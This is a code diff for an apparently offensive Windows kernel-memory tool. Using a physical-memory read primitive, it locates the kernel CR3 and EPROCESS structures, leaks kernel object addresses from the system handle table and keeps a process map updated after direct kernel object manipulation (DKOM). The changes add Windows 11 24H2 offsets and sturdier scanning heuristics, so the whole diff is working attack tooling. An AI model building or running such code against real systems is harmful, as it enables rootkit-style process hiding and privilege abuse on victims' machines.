@@ -185,15 +185,25 @@ static uint64_t kva_to_pa_cr3(uint64_t va, uint64_t cr3) {
  *
  * ntoskrnl_va: used to validate — kernel CR3 must map ntoskrnl's PML4 entry.
  * Pass 0 to skip validation (accept first candidate). */
+/* Verify candidate CR3 can translate ntoskrnl_va to a page with MZ header */
+static int cr3_maps_ntos(uint64_t cr3, uint64_t ntoskrnl_va) {
+    if (!ntoskrnl_va) return 1; /* no validation available, accept */
+    uint64_t pa = kva_to_pa_cr3(ntoskrnl_va, cr3);
+    if (!pa) return 0;
+    uint16_t mz = 0;
+    if (!phys_read(pa, &mz, 2)) return 0;
+    return mz == 0x5A4D; /* "MZ" */
+}
+
 static uint64_t find_kernel_cr3_impl(uint64_t ntoskrnl_va) {
     uint32_t nt_pml4i = ntoskrnl_va ? (uint32_t)((ntoskrnl_va >> 39) & 0x1FF) : 0;
     static uint8_t pg[4096];
 
-    /* Pass 1: classic self-ref at slot 0x1ED, scan first 256MB */
+    /* Pass 1: classic self-ref at slot 0x1ED, scan first 512MB */
     for (int ri = 0; ri < g_nranges; ri++) {
-        if (g_ranges[ri].base >= 0x10000000ULL) continue;
+        if (g_ranges[ri].base >= 0x20000000ULL) continue;
         uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
-        if (re > 0x10000000ULL) re = 0x10000000ULL;
+        if (re > 0x20000000ULL) re = 0x20000000ULL;
         for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
             uint64_t e = 0;
             if (!phys_read(pa + 0x1ED*8, &e, 8)) continue;
@@ -202,15 +212,17 @@ static uint64_t find_kernel_cr3_impl(uint64_t ntoskrnl_va) {
                 uint64_t ke = 0;
                 if (!phys_read(pa + nt_pml4i*8, &ke, 8) || !(ke & 1)) continue;
             }
+            /* Verify it can actually translate ntoskrnl_va to MZ page */
+            if (!cr3_maps_ntos(pa, ntoskrnl_va)) continue;
             return pa;
         }
     }
 
-    /* Pass 2: randomised self-ref slot (Win10 1703+ / Win11 22H2+), first 64MB */
+    /* Pass 2: randomised self-ref slot (Win10 1703+ / Win11), first 128MB */
     for (int ri = 0; ri < g_nranges; ri++) {
-        if (g_ranges[ri].base >= 0x4000000ULL) continue;
+        if (g_ranges[ri].base >= 0x8000000ULL) continue;
         uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
-        if (re > 0x4000000ULL) re = 0x4000000ULL;
+        if (re > 0x8000000ULL) re = 0x8000000ULL;
         for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
             if (!phys_read(pa, pg, 4096)) continue;
             for (int idx = 0x100; idx < 0x200; idx++) {
@@ -221,12 +233,39 @@ static uint64_t find_kernel_cr3_impl(uint64_t ntoskrnl_va) {
                     uint64_t ke = *(uint64_t*)(pg + nt_pml4i*8);
                     if (!(ke & 1)) continue;
                 }
+                if (!cr3_maps_ntos(pa, ntoskrnl_va)) continue;
                 return pa;
             }
         }
     }
 
-    /* Pass 3: no validation fallback */
+    /* Pass 3: wider scan — no self-ref required, just maps ntoskrnl MZ */
+    if (ntoskrnl_va) {
+        uint32_t pml4i_ntos = (uint32_t)((ntoskrnl_va >> 39) & 0x1FF);
+        for (int ri = 0; ri < g_nranges; ri++) {
+            uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
+            for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
+                uint64_t ke = 0;
+                if (!phys_read(pa + pml4i_ntos*8, &ke, 8)) continue;
+                if (!(ke & 1)) continue;
+                if (kva_to_pa_cr3(ntoskrnl_va, pa) == 0) continue;
+                if (!cr3_maps_ntos(pa, ntoskrnl_va)) continue;
+                /* Sanity: PML4[256..511] should have kernel entries,
+                 * PML4[0..255] should have mostly-zero user entries.
+                 * At least half of kernel slots should be non-present
+                 * (not every kernel slot is used). */
+                int kern_present = 0;
+                for (int i = 256; i < 512; i++) {
+                    uint64_t ke2 = 0;
+                    if (phys_read(pa + i*8, &ke2, 8) && (ke2 & 1)) kern_present++;
+                }
+                if (kern_present < 2) continue; /* implausible kernel PML4 */
+                return pa;
+            }
+        }
+    }
+
+    /* Pass 4: no validation fallback */
     if (ntoskrnl_va) return find_kernel_cr3_impl(0);
     return 0;
 }
@@ -267,21 +306,27 @@ static uint64_t find_kernel_cr3_with_ntos(void) {
 }
 
 /* ── NTDLL helpers for Method A ─────────────────────────────────────── */
-#define SystemHandleInformation 0x10
+/* Use SystemExtendedHandleInformation (0x40) — all fields are ULONG_PTR,
+ * avoiding the USHORT Handle truncation and ULONG ProcessId merge bug
+ * present in the legacy class-0x10 struct on 64-bit Windows. */
+#define SystemExtHandleInformation 0x40
 
 typedef struct {
-    ULONG      ProcessId;
-    UCHAR      ObjectTypeNumber;
-    UCHAR      Flags;
-    USHORT     Handle;
-    PVOID      Object;   /* kernel EPROCESS VA */
-    ACCESS_MASK GrantedAccess;
-} SYSTEM_HANDLE_ENTRY;
+    PVOID       Object;           /* kernel EPROCESS VA */
+    ULONG_PTR   UniqueProcessId;
+    ULONG_PTR   HandleValue;
+    ULONG       GrantedAccess;
+    USHORT      CreatorBackTraceIndex;
+    USHORT      ObjectTypeIndex;
+    ULONG       HandleAttributes;
+    ULONG       Reserved;
+} SHI_EX_ENTRY; /* 40 bytes */
 
 typedef struct {
-    ULONG              Count;
-    SYSTEM_HANDLE_ENTRY Handles[1];
-} SYSTEM_HANDLE_INFORMATION;
+    ULONG_PTR   Count;
+    ULONG_PTR   Reserved;
+    SHI_EX_ENTRY Handles[1];
+} SHI_EX;
 
 static NtQSI_t NtQSI = NULL;
 
@@ -392,9 +437,11 @@ static void eproc_map_update_after_dkom(uint64_t prev_flink_pa, uint64_t next_bl
 
 /* ── Static layout table — used ONLY as bootstrap for physical scan ─── */
 static const EP_OFFSETS g_scan_layouts[] = {
-    { 0x440, 0x448, 0x5A8, 0x87A }, /* Win10 1903+ / Win11 */
-    { 0x2E8, 0x2F0, 0x450, 0x6FA }, /* Win10 1809          */
-    { 0x2E0, 0x2E8, 0x448, 0x6F2 }, /* Win10 1507–1803      */
+    { 0x440, 0x448, 0x5A8, 0x87A }, /* Win10 1903+ / Win11 21H2–23H2       */
+    { 0x440, 0x448, 0x5B8, 0x87A }, /* Win11 24H2+ (build 26100+)           */
+    { 0x440, 0x448, 0x5B0, 0x87A }, /* Win11 24H2 variant                   */
+    { 0x2E8, 0x2F0, 0x450, 0x6FA }, /* Win10 1809                           */
+    { 0x2E0, 0x2E8, 0x448, 0x6F2 }, /* Win10 1507–1803                      */
 };
 static const uint32_t g_n_scan_layouts =
     (uint32_t)(sizeof g_scan_layouts / sizeof g_scan_layouts[0]);
@@ -574,15 +621,15 @@ static uint64_t eproc_via_handle(DWORD target_pid, const char *name) {
         return 0;
     }
 
-    /* Query all system handles — grow buffer until it fits */
+    /* Query all system handles using Extended class (0x40) — 64-bit fields */
     ULONG buf_size = 0x100000;
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SHI_EX *shi = NULL;
     NTSTATUS status;
     for (int tries = 0; tries < 8; tries++) {
-        shi = (SYSTEM_HANDLE_INFORMATION*)malloc(buf_size);
+        shi = (SHI_EX*)malloc(buf_size);
         if (!shi) break;
         ULONG ret_len = 0;
-        status = NtQSI(SystemHandleInformation, shi, buf_size, &ret_len);
+        status = NtQSI(SystemExtHandleInformation, shi, buf_size, &ret_len);
         if (status == 0) break;
         free(shi); shi = NULL;
         buf_size *= 2;
@@ -592,11 +639,10 @@ static uint64_t eproc_via_handle(DWORD target_pid, const char *name) {
     DWORD my_pid = GetCurrentProcessId();
     uint64_t eproc_kva = 0;
 
-    for (ULONG i = 0; i < shi->Count; i++) {
-        SYSTEM_HANDLE_ENTRY *he = &shi->Handles[i];
-        if (he->ProcessId != my_pid) continue;
-        if ((HANDLE)(uintptr_t)he->Handle != hProc) continue;
-        eproc_kva = (uint64_t)(uintptr_t)he->Object;
+    for (ULONG_PTR i = 0; i < shi->Count; i++) {
+        if ((DWORD)shi->Handles[i].UniqueProcessId != my_pid) continue;
+        if (shi->Handles[i].HandleValue != (ULONG_PTR)hProc) continue;
+        eproc_kva = (uint64_t)(uintptr_t)shi->Handles[i].Object;
         break;
     }
     free(shi);
@@ -619,8 +665,9 @@ static uint64_t eproc_via_handle(DWORD target_pid, const char *name) {
         return 0;
     }
 
-    /* Quick validate */
-    if (g_layout >= 0 && !validate_eprocess_pa(pa, target_pid, name, g_layout)) {
+    /* Quick validate — always run regardless of g_layout */
+    if (!validate_eprocess_pa(pa, target_pid, name,
+                              g_layout >= 0 ? g_layout : 0)) {
         printf("    [Method A] Validation failed at PA=0x%016" PRIX64 "\n", pa);
         return 0;
     }
@@ -773,12 +820,13 @@ static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
 
                     const EP_OFFSETS *ep = (const EP_OFFSETS*)&g_scan_layouts[li];
 
-                    uint64_t eproc_pa, flink = 0, blink = 0;
+                    uint64_t eproc_pa = cpa + off - ep->ImageFileName;
+                    if (eproc_pa & 7) continue; /* EPROCESS must be 8-byte aligned */
+                    uint64_t flink = 0, blink = 0;
                     uint32_t pid_val = 0;
 
                     if (off < ep->ImageFileName) {
                         /* Cross-boundary: EPROCESS starts before this chunk */
-                        eproc_pa = cpa + off - ep->ImageFileName;
                         uint8_t pb[4];
                         if (!phys_read(eproc_pa + ep->UniqueProcessId, pb, 4)) continue;
                         memcpy(&pid_val, pb, 4);
@@ -789,7 +837,6 @@ static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
                         if (phys_read(eproc_pa + ep->ActiveProcessLinks + 8, bb, 8))
                             memcpy(&blink, bb, 8);
                     } else {
-                        eproc_pa = cpa + off - ep->ImageFileName;
                         uint64_t pid_off_chunk = off - ep->ImageFileName + ep->UniqueProcessId;
                         if (pid_off_chunk + 4 <= csz)
                             memcpy(&pid_val, chunk + pid_off_chunk, 4);
@@ -818,6 +865,14 @@ static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
 
                     if ((flink >> 48) != 0xFFFF) continue; /* must be kernel VA */
 
+                    /* DTB (always at +0x028): page-aligned, realistic, physical addr */
+                    {
+                        uint8_t dbuf[8];
+                        if (!phys_read(eproc_pa + 0x028, dbuf, 8)) continue;
+                        uint64_t dtb; memcpy(&dtb, dbuf, 8);
+                        if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+                    }
+
                     /* Valid EPROCESS — confirm layout and add to map */
                     if (g_layout < 0) g_layout = li;
                     eproc_map_add(eproc_pa, flink, blink);
@@ -839,56 +894,92 @@ static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
     return 0;
 }
 
-/* ── Find System (PID=4) EPROCESS via physical scan (for layout detect) ── */
+/*
+ * find_system_eproc_pa — PID-first layout-agnostic scan.
+ *
+ * Does NOT use ImageFileName (avoids all offset guessing).
+ * Validates by:
+ *   1. QWORD at +0x440 == 4                   (UniqueProcessId = PID 4)
+ *   2. QWORD at +0x028 is page-aligned, >64KB  (DirectoryTableBase)
+ *   3. QWORD at +0x448 has top 2 bytes 0xFFFF  (ActiveProcessLinks.Flink)
+ *   4. QWORD at +0x450 has top 2 bytes 0xFFFF  (ActiveProcessLinks.Blink)
+ *
+ * These four constraints are essentially unique to the System EPROCESS
+ * across all Win10/11 versions regardless of layout changes.
+ *
+ * After finding the PA, sets g_kernel_cr3 from DTB and resolves g_layout
+ * by checking ImageFileName at all candidate offsets.
+ */
 static uint64_t find_system_eproc_pa(void) {
-    static uint8_t chunk[0x40000];
-    const uint32_t CHUNK = sizeof chunk;
-    const char *sname = "System";
-    const char fc = sname[0];
+    static uint8_t page[0x1000];
+    /* Need: PID(+0x440+8), Blink(+0x450+8) all in page → sub_max = 0x1000-0x458 */
+    const int sub_max = 0x1000 - 0x458;
 
-    printf("  [*] Finding System EPROCESS (layout detection)...\n");
+    printf("  [*] Finding System EPROCESS (PID-first scan, layout-agnostic)...\n");
 
+    /* System EPROCESS is always allocated early; search first 512MB */
     for (int ri = 0; ri < g_nranges; ri++) {
         uint64_t rbase = g_ranges[ri].base;
         uint64_t rend  = g_ranges[ri].base + g_ranges[ri].size;
-        /* System EPROCESS is always in low memory — stop at 256MB */
-        if (rbase >= 0x10000000ULL) continue;
-        uint64_t scan_end = rend < 0x10000000ULL ? rend : 0x10000000ULL;
+        if (rbase >= 0x20000000ULL) continue;
+        uint64_t scan_end = rend < 0x20000000ULL ? rend : 0x20000000ULL;
 
-        for (uint64_t cpa = rbase; cpa < scan_end; cpa += CHUNK) {
-            uint64_t csz = scan_end - cpa;
-            if (csz > CHUNK) csz = CHUNK;
-            if (!phys_read(cpa, chunk, (uint32_t)csz)) continue;
+        for (uint64_t page_pa = rbase; page_pa < scan_end; page_pa += 0x1000) {
+            if (!phys_read(page_pa, page, 0x1000)) continue;
 
-            for (uint64_t off = 0; off + 6 <= csz; off++) {
-                if (chunk[off] != (uint8_t)fc) continue;
-                if (strncmp((char*)(chunk+off), "System", 6) != 0) continue;
+            for (int sub = 0; sub <= sub_max; sub += 0x10) {
+                /* 1. PID = 4 (QWORD at +0x440; upper 32 bits must be 0) */
+                uint64_t pid;
+                memcpy(&pid, page + sub + 0x440, 8);
+                if (pid != 4) continue;
 
-                for (int li = 0; li < (int)N_LAYOUTS; li++) {
-                    const EP_OFFSETS *ep = (const EP_OFFSETS*)&g_scan_layouts[li];
-                    if (off < ep->ImageFileName) continue;
-                    uint64_t eproc_pa = cpa + off - ep->ImageFileName;
+                /* 2. DTB: page-aligned, realistic, must be a physical address
+                 * (not a kernel VA — e.g. 0xFFFFFFFE00000000 passes page-align
+                 *  check but is clearly a VA, not a CR3). Bit 40+ must be zero. */
+                uint64_t dtb;
+                memcpy(&dtb, page + sub + 0x028, 8);
+                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
 
-                    uint64_t pid_off = off - ep->ImageFileName + ep->UniqueProcessId;
-                    if (pid_off + 4 > csz) continue;
-                    uint32_t pid_val;
-                    memcpy(&pid_val, chunk + pid_off, 4);
-                    if (pid_val != 4) continue;
+                /* 3 & 4. Flink/Blink: canonical kernel VAs */
+                uint64_t flink, blink;
+                memcpy(&flink, page + sub + 0x448, 8);
+                memcpy(&blink, page + sub + 0x450, 8);
+                if ((flink >> 48) != 0xFFFF) continue;
+                if ((blink >> 48) != 0xFFFF) continue;
 
-                    uint64_t fl_off = off - ep->ImageFileName + ep->ActiveProcessLinks;
-                    if (fl_off + 8 > csz) continue;
-                    uint64_t flink;
-                    memcpy(&flink, chunk + fl_off, 8);
-                    if ((flink >> 48) != 0xFFFF) continue;
+                uint64_t eproc_pa = page_pa + (uint64_t)sub;
 
-                    printf("  [+] System EPROCESS PA=0x%016" PRIX64 " layout=%d\n",
-                           eproc_pa, li);
-                    g_layout = li;
-                    return eproc_pa;
+                /* Determine ImageFileName offset — check all candidates */
+                static const uint32_t name_cands[] = {
+                    0x5A8, 0x5B8, 0x5B0, 0x5C0, 0x5A0, 0x5C8
+                };
+                int layout_found = -1;
+                for (int ni = 0; ni < 6; ni++) {
+                    uint8_t nb[8] = {0};
+                    if (!phys_read(eproc_pa + name_cands[ni], nb, 7)) continue;
+                    if (memcmp(nb, "System", 6) != 0) continue;
+                    /* Confirm layout index in g_scan_layouts */
+                    for (int li = 0; li < (int)N_LAYOUTS; li++) {
+                        if (g_scan_layouts[li].ImageFileName == name_cands[ni]) {
+                            layout_found = li;
+                            break;
+                        }
+                    }
+                    if (layout_found < 0) layout_found = 0; /* fallback to layout 0 */
+                    break;
                 }
+
+                printf("  [+] System EPROCESS PA=0x%016" PRIX64
+                       "  DTB=0x%016" PRIX64 "  layout=%d\n",
+                       eproc_pa, dtb, layout_found);
+
+                g_kernel_cr3 = dtb;
+                if (layout_found >= 0) g_layout = layout_found;
+                return eproc_pa;
             }
         }
     }
+    printf("  [-] System EPROCESS not found in first 512MB\n");
     return 0;
 }
 
@@ -953,14 +1044,14 @@ static uint64_t get_eproc_kva_from_handles(DWORD target_pid) {
     if (!hProc) return 0;
 
     ULONG buf_size = 0x100000;
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SHI_EX *shi = NULL;
     NTSTATUS st = (NTSTATUS)-1;
     for (int t = 0; t < 8; t++) {
         free(shi);
-        shi = (SYSTEM_HANDLE_INFORMATION*)malloc(buf_size);
+        shi = (SHI_EX*)malloc(buf_size);
         if (!shi) break;
         ULONG rl = 0;
-        st = NtQSI(SystemHandleInformation, shi, buf_size, &rl);
+        st = NtQSI(SystemExtHandleInformation, shi, buf_size, &rl);
         if (st == 0) break;
         buf_size *= 2;
     }
@@ -968,9 +1059,9 @@ static uint64_t get_eproc_kva_from_handles(DWORD target_pid) {
     uint64_t kva = 0;
     if (shi && st == 0) {
         DWORD my_pid = GetCurrentProcessId();
-        for (ULONG i = 0; i < shi->Count; i++) {
-            if (shi->Handles[i].ProcessId == my_pid &&
-                (HANDLE)(uintptr_t)shi->Handles[i].Handle == hProc) {
+        for (ULONG_PTR i = 0; i < shi->Count; i++) {
+            if ((DWORD)shi->Handles[i].UniqueProcessId == my_pid &&
+                shi->Handles[i].HandleValue == (ULONG_PTR)hProc) {
                 kva = (uint64_t)(uintptr_t)shi->Handles[i].Object;
                 break;
             }
@@ -1299,11 +1390,17 @@ int main(int argc, char *argv[]) {
 
     load_phys_ranges();
 
-    g_kernel_cr3 = find_kernel_cr3_with_ntos();
-    printf(g_kernel_cr3 ? "[+] Kernel CR3 = 0x%016" PRIX64 "\n"
-                        : "[!] Kernel CR3 not found\n", g_kernel_cr3);
-
+    /* Primary: find System EPROCESS first — sets g_kernel_cr3 from its DTB.
+     * This avoids the fragile PML4 self-ref scan which gives wrong CR3 on Win11. */
     uint64_t system_eproc_pa = find_system_eproc_pa();
+
+    /* Fallback: if System EPROCESS not found or CR3 not set, try PML4 scan */
+    if (!g_kernel_cr3) {
+        g_kernel_cr3 = find_kernel_cr3_with_ntos();
+    }
+    printf(g_kernel_cr3 ? "[+] Kernel CR3 = 0x%016" PRIX64 "\n"
+                        : "[!] Kernel CR3 not found — page walk disabled\n",
+           g_kernel_cr3);
     printf("\n");
 
     SetConsoleCtrlHandler(ctrl_handler, TRUE);
